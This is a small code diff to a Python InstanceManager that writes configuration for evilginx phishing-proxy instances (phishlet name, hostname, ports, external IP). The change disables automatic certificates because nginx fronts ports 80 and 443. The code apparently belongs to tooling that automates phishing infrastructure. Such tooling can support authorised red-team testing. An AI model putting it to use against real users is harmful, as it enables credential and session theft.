@@ -294,7 +294,7 @@ class InstanceManager:
         https_port = int(os.environ.get("AGENT_HTTPS_PORT", payload.get("https_port", 8443)))
         dns_port = int(payload["dns_port"]) if payload.get("dns_port") else int(os.environ.get("AGENT_DNS_PORT", "5302"))
         config_dir = Path(payload["config_dir"])
-        autocert = bool(payload.get("autocert", self._default_autocert()))
+        autocert = False  # nginx owns port 80/443; evilginx can't do ACME
         external_ip = payload.get("external_ipv4") or self.settings.external_ip or "127.0.0.1"
 
         write_config(config_dir, base_domain, phishlet_hostname, phishlet_name,
